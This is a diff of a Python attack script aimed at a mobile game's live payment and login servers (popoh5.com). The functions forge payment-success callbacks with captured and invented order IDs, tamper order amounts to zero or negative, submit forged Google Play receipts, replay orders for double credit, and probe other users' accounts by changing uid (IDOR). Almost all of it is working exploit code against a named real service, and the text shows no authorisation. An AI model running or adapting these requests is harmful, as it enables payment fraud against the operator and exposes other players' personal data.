@@ -35,6 +35,18 @@ urllib3.disable_warnings()
 CAPTURED_SESSION = SESSION
 CAPTURED_ORDER_ID = "6c5a894fe7a4481cff0c2f554242f3e6"
 
+# Payment endpoint is on pay.popoh5.com:520, NOT login server
+PAY_SERVER  = SERVERS["pay"]    # https://pay.popoh5.com:520
+AUTH_SERVER = SERVERS["login"]  # https://login.popoh5.com:510
+
+# All known servers to probe — try each if primary times out
+ALL_SERVERS = [
+    ("pay",             SERVERS["pay"]),
+    ("login",           SERVERS["login"]),
+    ("account_primary", SERVERS["account_primary"]),
+    ("account_alt",     SERVERS["account_alt"]),
+]
+
 
 def log(label: str, resp: requests.Response):
     print(f"\n{'='*55}")
@@ -46,6 +58,23 @@ def log(label: str, resp: requests.Response):
         print(f"  JSON: {json.dumps(data, indent=2)[:500]}")
     except Exception:
         print(f"  Body: {resp.text[:400]}")
+
+
+def safe_post(endpoint: str, data: dict = None, pay_sign: bool = False,
+              servers=None) -> None:
+    """Try endpoint on multiple servers, print result or timeout for each."""
+    target_servers = servers or [(None, CAPTURED_SESSION.server)]
+    for name, srv in target_servers:
+        label = f"{name or 'default'} {srv}"
+        try:
+            resp = CAPTURED_SESSION.post(endpoint, data=data, server=srv,
+                                         pay_sign=pay_sign)
+            log(f"{endpoint} [{name}]", resp)
+            return  # stop at first response
+        except requests.exceptions.ConnectTimeout:
+            print(f"\n  [TIMEOUT] {label}{endpoint}")
+        except requests.exceptions.ConnectionError as e:
+            print(f"\n  [CONN ERR] {label}{endpoint}: {e}")
 
 
 # ─── Test 1: Direct paySuccess call with crafted order ────────────────────────
@@ -89,8 +118,9 @@ def test_paysuccess_forgery():
     ]
 
     for i, payload in enumerate(payloads):
-        resp = CAPTURED_SESSION.post("/v1/payment/paySuccess", data=payload)
-        log(f"paySuccess forgery #{i+1}", resp)
+        # paySuccess lives on the payment server, try all if needed
+        safe_post("/v1/payment/paySuccess", data=payload,
+                  servers=[("pay", PAY_SERVER), ("login", AUTH_SERVER)])
 
 
 # ─── Test 1b: paySuccess with EXACT smali-confirmed params ───────────────────
@@ -98,10 +128,9 @@ def test_paysuccess_exact_params():
     """
     CRITICAL PoC — use REAL cpOrderNo from Frida-captured payment flow.
     cpOrderNo=6c5a894fe7a4481cff0c2f554242f3e6 (PermanentPassx1, com.h5bi.winr.05)
-    Signed with SIGN_KEY_PAYMENT. If server doesn't validate against payment provider
-    this will credit the account.
+    If server doesn't validate against payment provider → account credited for free.
     """
-    payload = {
+    base_payload = {
         "orderAmount":       "0.99",
         "cpOrderNo":         CAPTURED_ORDER_ID,
         "goodsID":           "com.h5bi.winr.05",
@@ -113,94 +142,73 @@ def test_paysuccess_exact_params():
         "gameRoleServerId":  "1",
         "gameRoleServerName": "Server1",
     }
-    resp = CAPTURED_SESSION.post("/v1/payment/paySuccess", data=payload, pay_sign=True)
-    log("paySuccess — REAL cpOrderNo from Frida (CRITICAL PoC)", resp)
+    safe_post("/v1/payment/paySuccess", data=base_payload, pay_sign=True,
+              servers=[("pay", PAY_SERVER), ("login", AUTH_SERVER)])
 
     # Also try with a fresh fake order — tests if ANY forged order is accepted
-    fake_order = f"PENTEST_{int(time.time())}"
-    payload2 = dict(payload)
-    payload2["cpOrderNo"] = fake_order
-    resp2 = CAPTURED_SESSION.post("/v1/payment/paySuccess", data=payload2, pay_sign=True)
-    log("paySuccess — forged cpOrderNo (no real payment)", resp2)
+    fake_payload = dict(base_payload)
+    fake_payload["cpOrderNo"] = f"PENTEST_{int(time.time())}"
+    safe_post("/v1/payment/paySuccess", data=fake_payload, pay_sign=True,
+              servers=[("pay", PAY_SERVER), ("login", AUTH_SERVER)])
 
 
 # ─── Test 2: createOrder parameter tampering ──────────────────────────────────
 def test_create_order_tamper():
     """
-    Create order with manipulated amount.
-    Check if server validates amount server-side or trusts client.
+    Create order with manipulated amount — test if server validates server-side.
     """
-    # First create a legitimate structure, then manipulate
     test_cases = [
         {"productId": "com.h5bi.winr.crystal_01", "amount": "0.01",   "currencyType": "USD"},
-        {"productId": "com.h5bi.winr.crystal_big", "amount": "-1.00", "currencyType": "USD"},  # negative
-        {"productId": "com.h5bi.winr.crystal_01",  "amount": "0.00",  "currencyType": "USD"},  # zero
-        {"productId": "com.h5bi.winr.vip_999",     "amount": "0.99",  "currencyType": "USD"},  # wrong product
+        {"productId": "com.h5bi.winr.crystal_big", "amount": "-1.00", "currencyType": "USD"},
+        {"productId": "com.h5bi.winr.crystal_01",  "amount": "0.00",  "currencyType": "USD"},
+        {"productId": "com.h5bi.winr.vip_999",     "amount": "0.99",  "currencyType": "USD"},
     ]
 
     for i, data in enumerate(test_cases):
-        resp = CAPTURED_SESSION.post("/v1/auth/createOrder", data=data)
-        log(f"createOrder tamper #{i+1} amount={data['amount']}", resp)
+        safe_post("/v1/auth/createOrder", data=data,
+                  servers=[("login", AUTH_SERVER), ("pay", PAY_SERVER)])
 
 
 # ─── Test 3: Google Play receipt forgery ─────────────────────────────────────
 def test_google_play_receipt_forge():
     """
-    Submit a malformed/forged Google Play purchase receipt.
-    If the server doesn't verify with Google's API, it may credit the account.
+    Submit a forged Google Play receipt — if server doesn't call Google's API to verify,
+    it may credit the account.
     """
-    # Minimal valid-looking Google Play receipt structure
+    import base64, os as _os
     fake_receipt = {
-        "packageName":    "com.h5bi.winr",
-        "productId":      "com.h5bi.winr.crystal_01",
-        "purchaseTime":   int(time.time() * 1000),
-        "purchaseState":  0,  # 0 = purchased
-        "purchaseToken":  "forged_" + uuid.uuid4().hex * 2,
-        "orderId":        f"GPA.3300-1234-5678-{uuid.uuid4().hex[:5].upper()}",
-        "autoRenewing":   False,
-        "acknowledged":   False,
+        "packageName":   "com.h5bi.winr",
+        "productId":     "com.h5bi.winr.crystal_01",
+        "purchaseTime":  int(time.time() * 1000),
+        "purchaseState": 0,
+        "purchaseToken": "forged_" + uuid.uuid4().hex * 2,
+        "orderId":       f"GPA.3300-1234-5678-{uuid.uuid4().hex[:5].upper()}",
+        "autoRenewing":  False,
+        "acknowledged":  False,
     }
-
-    # Google Play signature (forged — random bytes as base64)
-    import base64, os
-    fake_signature = base64.b64encode(os.urandom(256)).decode()
+    fake_sig = base64.b64encode(_os.urandom(256)).decode()
 
     payloads = [
-        # Without signature
-        {
-            "receipt":    json.dumps(fake_receipt),
-            "productId":  "com.h5bi.winr.crystal_01",
-            "orderId":    fake_receipt["orderId"],
-        },
-        # With forged signature
-        {
-            "receipt":    json.dumps(fake_receipt),
-            "signature":  fake_signature,
-            "productId":  "com.h5bi.winr.crystal_01",
-            "orderId":    fake_receipt["orderId"],
-        },
-        # Just the token (some servers only check purchaseToken)
-        {
-            "purchaseToken": fake_receipt["purchaseToken"],
-            "productId":     "com.h5bi.winr.crystal_01",
-            "packageName":   "com.h5bi.winr",
-        },
+        {"receipt": json.dumps(fake_receipt), "productId": "com.h5bi.winr.crystal_01",
+         "orderId": fake_receipt["orderId"]},
+        {"receipt": json.dumps(fake_receipt), "signature": fake_sig,
+         "productId": "com.h5bi.winr.crystal_01", "orderId": fake_receipt["orderId"]},
+        {"purchaseToken": fake_receipt["purchaseToken"],
+         "productId": "com.h5bi.winr.crystal_01", "packageName": "com.h5bi.winr"},
     ]
 
     for i, payload in enumerate(payloads):
-        resp = CAPTURED_SESSION.post("/v1/user/postGooglePlayVerify", data=payload)
-        log(f"GooglePlay receipt forge #{i+1}", resp)
+        safe_post("/v1/user/postGooglePlayVerify", data=payload,
+                  servers=[("login", AUTH_SERVER), ("pay", PAY_SERVER)])
 
 
 # ─── Test 4: Order replay attack ──────────────────────────────────────────────
 def test_order_replay(real_order_id: str = None):
     """
-    If you have a real orderId from one purchase, try replaying it
-    to get credited twice (missing idempotency check).
-    Fill real_order_id from Burp capture.
+    Replay a real orderId to get credited twice (idempotency check).
     """
     if not real_order_id:
-        print("\n[SKIP] Order replay — provide real_order_id from Burp capture")
+        print("\n[SKIP] Order replay — no real_order_id")
         return
 
     payload = {
@@ -211,23 +219,17 @@ def test_order_replay(real_order_id: str = None):
         "currencyType": "USD",
     }
 
-    # Try 3 times — server should reject after first
     for attempt in range(3):
-        resp = CAPTURED_SESSION.post("/v1/payment/paySuccess", data=payload)
-        log(f"Order replay #{attempt+1} orderId={real_order_id}", resp)
+        safe_post("/v1/payment/paySuccess", data=payload,
+                  servers=[("pay", PAY_SERVER), ("login", AUTH_SERVER)])
         time.sleep(1)
 
 
 # ─── Test 5: getUserInfo IDOR ─────────────────────────────────────────────────
 def test_idor_getuserinfo():
     """
-    Test if /v1/auth/getUserInfo exposes other users' data by modifying uid.
-    IDOR vulnerability: authenticated as user A, access user B's data.
+    IDOR: authenticated as uid=A, request uid=B — if it returns B's data, confirmed.
     """
-    if not CAPTURED_SESSION.uid:
-        print("\n[SKIP] IDOR test — no session")
-        return
-
     own_uid = int(CAPTURED_SESSION.uid)
     test_uids = [str(own_uid + i) for i in range(-3, 4) if i != 0]
 
@@ -235,21 +237,23 @@ def test_idor_getuserinfo():
     print("  TEST: IDOR — getUserInfo with other UIDs")
 
     for target_uid in test_uids:
-        # Modify uid in request while keeping own valid token
-        resp = CAPTURED_SESSION.get("/v1/auth/getUserInfo",
-                                     extra_params={"uid": target_uid})
-        status = resp.status_code
-        if status == 200:
-            try:
-                data = resp.json()
-                if data.get("code") == 0:  # success
-                    print(f"  [IDOR ✓] uid={target_uid} => {json.dumps(data)[:200]}")
-                else:
-                    print(f"  [OK 200] uid={target_uid} code={data.get('code')} msg={data.get('msg')}")
-            except Exception:
-                print(f"  [200] uid={target_uid} => {resp.text[:100]}")
-        else:
-            print(f"  [{status}] uid={target_uid}")
+        try:
+            resp = CAPTURED_SESSION.get("/v1/auth/getUserInfo",
+                                        extra_params={"uid": target_uid},
+                                        server=AUTH_SERVER)
+            if resp.status_code == 200:
+                try:
+                    data = resp.json()
+                    if data.get("code") == 0:
+                        print(f"  [IDOR ✓] uid={target_uid} => {json.dumps(data)[:200]}")
+                    else:
+                        print(f"  [OK 200] uid={target_uid} code={data.get('code')} msg={data.get('msg')}")
+                except Exception:
+                    print(f"  [200] uid={target_uid} => {resp.text[:100]}")
+            else:
+                print(f"  [{resp.status_code}] uid={target_uid}")
+        except (requests.exceptions.ConnectTimeout, requests.exceptions.ConnectionError) as e:
+            print(f"  [TIMEOUT/ERR] uid={target_uid}: {e}")
 
 
 if __name__ == "__main__":
